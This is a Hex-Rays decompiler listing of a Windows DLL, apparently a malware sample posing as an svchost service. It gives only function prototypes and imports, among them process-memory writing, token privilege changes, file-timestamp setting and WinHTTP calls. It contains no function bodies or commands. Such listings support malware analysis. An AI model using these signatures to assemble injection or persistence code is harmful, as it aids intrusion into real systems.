/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_10001005();
_DWORD *__thiscall sub_10001027(_DWORD *this);
_DWORD *__thiscall sub_10001057(_DWORD *this, char a2);
int sub_10001073();
int sub_10001077();
int sub_1000107B();
void *__thiscall sub_1000107F(_DWORD *this);
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
int RegisterService();
int __stdcall sub_100010E9(HMODULE lpParameter, int a2, int a3);
int sub_100010FD(void); // weak
_DWORD *__thiscall sub_10001145(_DWORD *this, char a2);
void __thiscall sub_10001161(_DWORD *this);
int __cdecl sub_10001176(LPCSTR lpRootPathName); // idb
char sub_10001222();
bool sub_10001421();
int sub_1000149A();
int sub_100014B0();
const CHAR *sub_100014C6();
int sub_10001564();
// char __usercall sub_10001568@<al>(int a1@<ebp>);
char __cdecl sub_10001581(LPSTR lpDst, LPCSTR lpString);
char __cdecl sub_10001666(LPSTR lpTempFileName);
char __cdecl sub_10001764(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPCSTR lpExistingFileName, CHAR *lpNewFileName);
char sub_1000195C();
char sub_100019F8();
_BYTE *__thiscall sub_10001B09(_BYTE *this, char a2);
int __thiscall sub_10001B45(_BYTE *this);
int sub_10001B54();
int __thiscall sub_10001B58(_BYTE *this);
char __thiscall sub_10001B69(_BYTE *this);
_DWORD *__thiscall sub_10001B6D(_DWORD *this, char a2);
void *__thiscall sub_10001B89(_DWORD *this);
int __thiscall sub_10001BB3(int this, char a2, int a3, int a4, int a5, char a6, int a7, int a8, int a9, int a10, char a11, int a12, int a13, int a14, int a15);
void *__thiscall sub_10001CA5(void *this, char a2);
int __thiscall sub_10001CC1(int this);
int __thiscall sub_10001DB2(_BYTE *this);
char __cdecl sub_10001E4B(LPCSTR lpSrc, _BYTE *lpBuffer, int Buffer, volatile LONG *a4);
char __cdecl sub_10001EE5(__int16 a1, __int16 a2, __int16 a3, __int16 a4);
char __cdecl sub_10001F58(__int16 a1, __int16 a2, __int16 a3, __int16 a4, volatile LONG *a5);
BSTR **__thiscall sub_10002101(BSTR **this, LPCSTR lpString);
BSTR *__thiscall sub_10002168(BSTR *this, LPCSTR lpString);
int __thiscall sub_1000219B(volatile LONG *this);
void __thiscall sub_100021C8(int this);
const CHAR *sub_10002211();
const CHAR *sub_10002227();
int sub_1000223D();
int sub_10002253();
int sub_10002269();
int sub_1000227F();
int sub_10002295();
int sub_100022AB();
int sub_100022C1();
int sub_1000232C();
int sub_10002342();
int sub_10002358();
int sub_1000236E();
char *sub_10002384();
char *sub_1000239A();
char *sub_100023B0();
char *sub_100023C6();
char *sub_100023DC();
char *sub_100023F2();
char *sub_10002408();
char *sub_1000241E();
const CHAR *sub_10002434();
const CHAR *sub_1000244A();
int sub_10002460();
int __thiscall sub_1000246B(int this, int a2, int a3, int a4, int a5);
void *__thiscall sub_10002590(void *this, char a2);
void __thiscall sub_100025AC(int this);
int __thiscall sub_1000264E(_DWORD *this);
char __thiscall sub_10002711(_DWORD *this);
char __thiscall sub_100027CD(_DWORD *this);
HMODULE __thiscall sub_10002BF4(HMODULE *this);
int __thiscall sub_10002C2F(_DWORD *this);
void __thiscall sub_10002C5B(int *this);
void __thiscall sub_10002C86(int this);
int __thiscall sub_10002D03(int this);
void __fastcall sub_10002E57(int *a1);
int sub_10003169();
int __thiscall sub_100031A7(int *this);
int __thiscall sub_100031FA(void *this, unsigned int a2, int a3);
BOOL __thiscall sub_10003248(CHAR *this, const CHAR *a2, __int16 a3, LPCSTR lpString2);
int __thiscall sub_1000327A(int (__stdcall **this)(_DWORD), int a2, int a3, int a4);
LPSTR __thiscall sub_100032A4(int this, const CHAR *a2, __int16 a3);
BOOL __thiscall sub_100032E3(CHAR *this, LPCSTR lpString2);
int __thiscall sub_10003302(int this, _DWORD *a2, _WORD *a3);
BOOL __thiscall sub_10003326(int this);
BOOL __thiscall sub_10003373(int *this);
int __thiscall sub_100033B9(void **this);
int __thiscall sub_10003425(void *this, int a2, const char **a3);
int __stdcall sub_1000358F(LPSTR lpCommandLine, DWORD dwCreationFlags, DWORD *a3);
int __thiscall sub_10003605(void *this, LPSTR lpCommandLine, DWORD ExitCode, DWORD dwMilliseconds);
int __stdcall sub_100036BC(LPSTR lpCommandLine, DWORD dwCreationFlags); // idb
int __thiscall sub_100036EE(void *this, int a2, int a3);
int __thiscall sub_1000377D(_DWORD **this, _DWORD *a2, void **a3, int a4);
int __thiscall sub_10003852(int this, int a2, int a3, int a4, LPCSTR a5, int a6, _DWORD *a7, int a8);
int __thiscall sub_10003903(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, _WORD *a7);
int __thiscall sub_1000399C(void *this, _DWORD *a2, void *Src, size_t Size, CHAR *a5);
int __thiscall sub_10003AA6(void *this, int a2, int a3, int a4, LPCSTR a5, LPCSTR lpFileName, CHAR *a7);
BOOL __thiscall sub_10003B0A(int this, int a2, int a3, int a4, LPCSTR a5, void *Src, size_t Size, CHAR *a8);
int __thiscall sub_10003BD2(_DWORD **this, int a2, int a3, int a4, int a5, unsigned int a6);
int __stdcall sub_10003C15(LPCSTR lpFileName, LPVOID *a2, DWORD *a3);
int sub_10003CAF();
int __thiscall sub_10003CC4(_DWORD *this, int a2, int a3);
int __stdcall sub_10003DA2(int a1, int a2);
int __thiscall sub_10003DD5(int this, char *Str1);
char __thiscall sub_1000436A(void *this, void **a2, _DWORD *a3, LPCSTR lpString);
char __thiscall sub_100043E5(int *this, void **a2, int *a3, LPCSTR lpString, int a5);
char __thiscall sub_1000456F(void *this, void **a2, int *a3, LPCSTR a4, int a5, LPCSTR a6);
char __thiscall sub_100045FA(int this, LPCSTR lpString);
char __thiscall sub_10004616(void *this, int a2);
char __stdcall sub_10004644(void **a1, _DWORD *a2, LPCSTR lpString, int Size);
char __stdcall sub_100046DB(void **a1, _DWORD *a2, int a3);
BOOL __thiscall sub_10004711(int this);
char __thiscall sub_10004767(int this, void **a2, _DWORD *a3, LPCSTR lpString);
int __thiscall sub_10004B3D(void *this);
int __thiscall sub_10004B7F(void *this);
DWORD sub_10004BAE();
int __thiscall sub_10004BF2(int (__stdcall **this)(_DWORD));
int __thiscall sub_10004C3B(int this, int a2);
char *sub_10004D02();
int sub_10004D45();
int __stdcall sub_10004D7D(unsigned int a1, unsigned int a2);
BOOL __stdcall sub_10004D95(unsigned int a1);
int __cdecl sub_10004DA4(void *); // idb
BOOL __cdecl sub_10004E27(BYTE Data);
BOOL sub_10004E53();
int sub_10004E74();
int sub_10004F7C();
// char __userpurge sub_10004F80@<al>(int a1@<ebp>, int a2, int a3);
char __thiscall sub_10004FA6(int this, LPCSTR a2, void *Src, size_t Size);
int __cdecl sub_10005070(void *); // idb
int __cdecl sub_100050CE(void *); // idb
BOOL __cdecl sub_1000512C(BYTE Data);
int __thiscall sub_10005155(_DWORD **this);
int sub_10005162();
int sub_10005178();
const CHAR *sub_1000518E();
int sub_100051A4();
int sub_10005220();
const CHAR *sub_1000527D();
const CHAR *sub_10005293();
const CHAR *sub_100052A9();
const CHAR *sub_100052BF();
const CHAR *sub_100052D5();
const CHAR *sub_100052EB();
int __thiscall sub_100052FC(int this, int a2);
int __thiscall sub_10005339(LPCSTR *this);
_DWORD *__thiscall sub_10005433(_DWORD *this, char a2);
void *__thiscall sub_1000544F(_DWORD *this);
const CHAR *sub_10005488();
int __stdcall sub_10005499(HMODULE lpParameter, int a2, int a3);
bool __cdecl sub_10005675(int *a1);
char sub_100056A3();
HRESULT __stdcall DllCanUnloadNow();
HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv);
HRESULT __stdcall DllRegisterServer();
HRESULT __stdcall DllUnregisterServer();
DWORD __stdcall sub_1000587B(LPVOID lpThreadParameter); // idb
bool __cdecl sub_10005AA6(PHKEY phkResult);
HMODULE __cdecl sub_10005B14(int a1, HKEY hKey);
char sub_10005BA5();
int __stdcall StartAddress(LPVOID lpThreadParameter);
BOOL __stdcall sub_10005F06(LPVOID lpThreadParameter);
char sub_10005F64();
HANDLE __cdecl sub_1000604A(HANDLE *a1);
HANDLE __cdecl sub_100060A2(HANDLE *a1);
int sub_10006102();
char sub_1000619F();
char __cdecl sub_10006266(LPCSTR lpString);
int sub_10006331();
char *sub_10006398();
char sub_10006431();
HMODULE sub_100064BC();
_DWORD *__thiscall sub_1000651E(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_10006562(_DWORD *this, char a2);
void __thiscall sub_1000657E(_DWORD *this);
int __cdecl sub_100065A7(unsigned int a1);
char sub_100066C3();
char sub_1000687D();
int __cdecl sub_10006A3B(LPCSTR a1, CHAR *lpString2);
int __cdecl sub_10006AA4(LPCSTR a1, CHAR *lpString2);
bool sub_10006C08();
char sub_10006C73();
int sub_10006D11();
bool sub_10006D85();
int sub_10006DEB();
char sub_10006EF0();
char sub_10006F72();
char sub_10007030();
char __cdecl sub_100070E6(HANDLE hEvent, DWORD dwMilliseconds, HANDLE *a3);
HMODULE sub_100071C5();
int (*NotifyLogoffUser())(void);
int (*NotifyLogonUser())(void);
int (*ServiceMain())(void);
int (*LCEControlServer())(void);
int (*RegisterTheEventServiceDuringSetup())(void);
int (*RegisterTheEventServiceAfterSetup())(void);
int (*RegisterTheFrigginEventServiceDuringSetup())(void);
int (*RegisterTheFrigginEventServiceAfterSetup())(void);
int (*icsvnt32_3())(void);
void __stdcall PerUserInit();
HRESULT __stdcall DllInstall(BOOL bInstall, PCWSTR pszCmdLine);
int (*RestoreMyDocsFolder())(void);
int (*CreateSharedDocuments())(void);
int (*SvchostPushServiceGlobals())(void);
_DWORD *__thiscall sub_100076B2(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
_DWORD *__thiscall sub_10007702(_DWORD *this, char a2);
int __thiscall sub_1000771E(int this);
int __thiscall sub_100077CD(_DWORD *this);
int sub_100077D1();
void *__thiscall sub_100077D7(_DWORD *this);
int sub_10007806();
int __fastcall wsprintfA_thunk(int a1, int a2);
int __fastcall CreateProcessAsUserA_thunk(int a1, int a2);
void OpenProcessToken_thunk();
void RegCloseKey_thunk();
void RegOpenKeyExA_thunk();
int __fastcall OLEAUT32_6_thunk(int a1, int a2);
void __stdcall __noreturn sub_10007B26(int a1);
int __cdecl sub_10007B95(int a1, int a2, int a3, VARTYPE vt, ICreateErrorInfo *perrinfo, LPCWSTR lpString, int a7);
int __cdecl sub_10007BD1(int a1, int a2, int a3, VARTYPE vt, ICreateErrorInfo *pperrinfo, LPCWSTR lpString, int a7, void **a8);
int __cdecl sub_1000807A(int, int, int, VARTYPE vt, ICreateErrorInfo *pperrinfo, LPCWSTR lpString, int); // idb
int sub_100081A2();
_DWORD *sub_100081AC();
void __cdecl sub_100081CA(); // idb
BSTR __stdcall sub_100081E0(LPCSTR lpString);
_DWORD *__thiscall sub_100082C9(_DWORD *this, int a2, __int16 a3);
void __cdecl __noreturn sub_10008325(int a1, int a2);
_DWORD *__thiscall sub_10008349(_DWORD *this, int a2, int a3, char a4);
_DWORD *__thiscall sub_1000837B(_DWORD *this, char a2);
_DWORD *__thiscall sub_10008397(_DWORD *this, int a2);
HLOCAL __thiscall sub_100083C4(_DWORD *this);
FARPROC __stdcall sub_100083EA(int *a1, int *Arguments);
_DWORD *__stdcall sub_10008673(_DWORD *a1, const void *a2);
// void __cdecl operator delete(void *); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl operator new(unsigned int); idb
// void *__cdecl memset(void *, int Val, size_t Size);
// size_t __cdecl strlen(const char *Str);
// int __cdecl strcmp(const char *Str1, const char *Str2);
// int __cdecl local_unwind2(_DWORD, _DWORD); weak
// int __cdecl atexit(void (__cdecl *)());
// void __stdcall __noreturn CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
int __cdecl sub_10008918(int a1);
void sub_10008959();
BOOL __cdecl sub_1000896B(void *Src, void *a2, _DWORD *a3, int a4, int *a5);
BOOL __cdecl sub_10008A3A(void *a1, void *Src, size_t Size, void **Block, _DWORD *a5);
void __cdecl sub_10008B80(int a1, int a2);
BOOL __cdecl sub_10008BA5(void *Src, void *a2, int *a3, int a4, int *a5);
BOOL __cdecl sub_10008C74(void *a1, int *Src, unsigned int a3, void **a4, _DWORD *a5);
void __cdecl sub_10008DAB(void *Block);
int __cdecl sub_10008DE6(int a1, int a2, _DWORD *a3, int a4);
int __cdecl sub_10008E91(int a1, int a2);
int sub_10008F11();
char __cdecl sub_1000905D(int a1, char a2);
int __cdecl sub_1000909D(int *a1, _DWORD *a2, unsigned __int8 a3);
int __cdecl sub_10009371(int a1);
int __cdecl sub_10009DE3(int a1, char a2, int a3, _BYTE *a4);
int __cdecl sub_10009E57(int a1, char a2, int a3);
int __cdecl sub_10009EA5(unsigned __int8 *a1, int a2, _DWORD *a3, int a4, int *a5);
int __cdecl sub_1000A856(unsigned __int8 *a1, int a2, int *a3, int a4, int *a5);
int sub_1000B21F();
int sub_1000B235();
bool __cdecl sub_1000B246(PSECURITY_DESCRIPTOR pSecurityDescriptor);
char __cdecl sub_1000B2B4(_DWORD *a1, LPCSTR lpName);
char __cdecl sub_1000B316(HANDLE hHandle, LPCSTR lpName, DWORD dwMilliseconds, DWORD dwExitCode);
BOOL __cdecl sub_1000B3C8(HANDLE hEvent);
BOOL __cdecl sub_1000B3DD(HANDLE *a1);
int __cdecl sub_1000B3FD(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, size_t Size, _DWORD *a6);
int __cdecl sub_1000B4ED(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData, DWORD cbData, DWORD dwType); // idb
bool __cdecl sub_1000B5AA(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName);
bool sub_1000B688();
char __cdecl sub_1000B695(LPCSTR lpString);
int __cdecl sub_1000B6D3(LPCSTR lpName, HANDLE *a2);
char __cdecl sub_1000B75A(LPCSTR lpName);
char __cdecl sub_1000B7CD(LPCSTR lpName, DWORD dwMilliseconds);
int sub_1000B941();
bool __cdecl sub_1000B952(LPCSTR lpFileName);
LPCSTR __cdecl sub_1000B963(LPCSTR lpString);
bool __cdecl sub_1000B9F2(LPCSTR lpExistingFileName);
bool __cdecl sub_1000BA00(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
int sub_1000BACE();
// char __usercall sub_1000BAD2@<al>(int a1@<ebp>);
char __cdecl sub_1000BAEA(LPSTR lpFilename, size_t Size);
HANDLE __cdecl sub_1000BB7F(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPCSTR lpFileName, DWORD dwCreationDisposition);
char __cdecl sub_1000BC61(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPCSTR lpFileName, DWORD dwCreationDisposition);
int sub_1000BD25();
// char __usercall sub_1000BD29@<al>(int a1@<ebp>);
char __cdecl sub_1000BD41(HANDLE hFile, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite, char a4, _BYTE *a5);
char __cdecl sub_1000BE44(HANDLE hFile, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite);
int sub_1000C03F();
// char __usercall sub_1000C043@<al>(int a1@<ebp>);
int sub_1000C16D();
// char __usercall sub_1000C171@<al>(int a1@<ebp>);
char __cdecl sub_1000C189(LPCSTR lpFileName);
_DWORD *__thiscall sub_1000C396(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000C3C6(_DWORD *this, char a2);
void __thiscall sub_1000C3E2(_DWORD *this);
char __thiscall sub_1000C3E9(_BYTE *this);
char __thiscall sub_1000C408(int this);
bool __cdecl sub_1000C51E(HANDLE TokenHandle, LPCSTR lpName, char a3);
char __thiscall sub_1000C59E(int this);
_DWORD *__thiscall sub_1000C6ED(_DWORD *this, char a2, LPCSTR lpSrc, int a4, int a5);
_DWORD *__thiscall sub_1000C772(_DWORD *this, char a2);
BOOL __thiscall sub_1000C78E(_DWORD *this);
int __thiscall sub_1000C7A8(_DWORD *this, char a2, LPCSTR lpProcName, int a4, int a5, int a6, int *a7);
char __cdecl sub_1000C83A(void *a1, int a2);
int sub_1000C962();
char __cdecl sub_1000C9BB(LPSTR lpString1, int String2);
const CHAR *sub_1000CA42();
BOOL __cdecl sub_1000CA53(DWORD dwProcessId, DWORD *pSessionId);
int __cdecl sub_1000CA68(LPCSTR lpString1, DWORD *a2, char a3);
int __cdecl sub_1000CA7F(LPCSTR lpString1, DWORD *a2, int a3, char a4);
bool __cdecl sub_1000CC2C(DWORD dwProcessId, LPSTR Name, size_t Size);
char __cdecl sub_1000CD87(DWORD dwProcessId, int a2);
char __cdecl sub_1000CE6A(DWORD dwProcessId);
bool __cdecl sub_1000CE78(LPCSTR lpString2, LPCSTR lpString1);
char __cdecl sub_1000CEA8(LPCSTR lpString1);
char __cdecl sub_1000CF46(LPCSTR lpString2);
int __cdecl sub_1000D041(int a1, int a2, int a3, unsigned int a4);
const CHAR *sub_1000D0BF();
const CHAR *sub_1000D0D5();
_DWORD *__thiscall sub_1000D0E6(_DWORD *this);
int __thiscall sub_1000D0FC(HANDLE *this);
char __thiscall sub_1000D11A(_BYTE *this);
char __thiscall sub_1000D143(int this);
int __thiscall sub_1000D1F4(int this);
char __thiscall sub_1000D21D(int this);
char __thiscall sub_1000D2A2(int (__stdcall **this)(_DWORD, _DWORD, _DWORD), int a2, int a3, HANDLE *a4);
char __thiscall sub_1000D2E9(int (__stdcall **this)(_DWORD, _DWORD));
bool sub_1000D381();
int sub_1000D3AF();
BOOL sub_1000D567();
unsigned int sub_1000D578();
int sub_1000D5C0();
// char __usercall sub_1000D5C4@<al>(int a1@<ebp>);
CHAR *sub_1000D5DC();
int __cdecl sub_1000D691(int a1, unsigned int a2, unsigned int *a3);
char sub_1000D710();
BOOL sub_1000D8E9();
char sub_1000D956();
HANDLE __cdecl sub_1000DA4F(DWORD dwProcessId);
void *__cdecl sub_1000DAAA(HANDLE hProcess, LPCVOID lpBuffer, SIZE_T nSize);
bool __cdecl sub_1000DB61(int a1, int a2);
BOOL __cdecl sub_1000DBC9(HANDLE hHandle);
char __cdecl sub_1000DC63(DWORD dwProcessId, LPCSTR lpString);
char __cdecl sub_1000DD86(DWORD dwProcessId, LPCVOID lpBuffer, SIZE_T nSize, LPCVOID a4, SIZE_T a5);
char __cdecl sub_1000DEE0(LPCSTR lpFileName, DWORD dwProcessId, int (__stdcall *a3)());
char __cdecl sub_1000E002(void *Src, size_t Size, void *a3, size_t a4);
int sub_1000E120();
const CHAR *sub_1000E136();
const CHAR *sub_1000E14C();
const CHAR *sub_1000E162();
const CHAR *sub_1000E178();
const CHAR *sub_1000E18E();
char __cdecl sub_1000E19F(FARPROC *a1, int (__stdcall *a2)());
int __cdecl sub_1000E21E(int a1);
int nullsub_1(); // weak
const CHAR *sub_1000E4CF();
char *__thiscall sub_1000E4E0(char *this, LPCSTR lpSrc, int a3, int a4, char a5);
char __thiscall sub_1000E539(int this, int a2, _BYTE *lpBuffer, int Buffer, volatile LONG *a5);
char __thiscall sub_1000E777(int this, int a2);
char __stdcall sub_1000E7A4(HANDLE hFile, _BYTE *lpBuffer);
char __thiscall sub_1000E82D(CHAR *this, _DWORD *a2, DWORD *a3);
void __stdcall sub_1000E9D8(void *Block);
BOOL __thiscall sub_1000E9E6(int this);
UINT __thiscall sub_1000EA4D(BSTR **this);
const CHAR *sub_1000EA80();
_BYTE *__thiscall sub_1000EAA0(_BYTE *this);
_DWORD *__thiscall sub_1000EAC0(_DWORD *this, char a2);
void __thiscall sub_1000EAE0(_DWORD *this);
void **__stdcall sub_1000EAF0(HKEY hKey, void **a2, void **a3);
int __thiscall sub_1000EDB0(void *this, LPVOID lpOptional, DWORD dwOptionalLength, void **a4, unsigned int *a5, LPCCH lpMultiByteStr, LPCCH a7, INTERNET_PORT nServerPort, char a9);
bool sub_1000F1E0();
bool __thiscall sub_1000F200(int *this);
char __stdcall sub_1000F240(int a1);
void __stdcall sub_1000F260(void *a1);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
void GetSystemMetrics_thunk();
void SetSecurityDescriptorDacl_thunk();
void InitializeSecurityDescriptor_thunk();
void RegQueryValueExA_thunk();
void RegSetValueExA_thunk();
void RegDeleteValueA_thunk();
void FreeSid_thunk();
void SetNamedSecurityInfoA_thunk();
void AdjustTokenPrivileges_thunk();
void LookupPrivilegeValueA_thunk();
void SetEntriesInAclA_thunk();
void AllocateAndInitializeSid_thunk();
void GetNamedSecurityInfoA_thunk();
void LookupAccountSidA_thunk();
void GetTokenInformation_thunk();
void GetUserNameA_thunk();
void RegEnumKeyExA_thunk();
void RegQueryInfoKeyA_thunk();
void OLEAUT32_200_thunk();
void OLEAUT32_201_thunk();
void OLEAUT32_12_thunk();
void OLEAUT32_202_thunk();
void OLEAUT32_9_thunk();
void OLEAUT32_8_thunk();
void OLEAUT32_2_thunk();
void OLEAUT32_7_thunk();
int __fastcall WinHttpCloseHandle_thunk(int a1, int a2);
void WinHttpReadData_thunk();
void WinHttpQueryDataAvailable_thunk();
void WinHttpReceiveResponse_thunk();
void WinHttpSendRequest_thunk();
void WinHttpOpenRequest_thunk();
void WinHttpConnect_thunk();
void WinHttpOpen_thunk();
void WinHttpCheckPlatform_thunk();
int __fastcall ObtainUserAgentString_thunk(int a1, int a2);
// HRESULT __stdcall ObtainUserAgentString(DWORD dwOption, LPSTR pszUAOut, DWORD *cbSize);
// int __thiscall std::string::string(_DWORD, _DWORD); weak
// int __thiscall std::string::assign(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __thiscall std::string::_Tidy(_DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
_UNKNOWN loc_1000F620; // weak
_UNKNOWN loc_1000F67C; // weak
_UNKNOWN loc_1000F918; // weak
_UNKNOWN loc_1000F9D0; // weak
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// extern DWORD (__stdcall *GetLastError)();
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// extern UINT (__stdcall *GetTempFileNameA)(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern HANDLE (__stdcall *OpenEventA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *GetExitCodeProcess)(HANDLE hProcess, LPDWORD lpExitCode);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *MoveFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
// extern BOOL (__stdcall *ProcessIdToSessionId)(DWORD dwProcessId, DWORD *pSessionId);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *MoveFileExA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
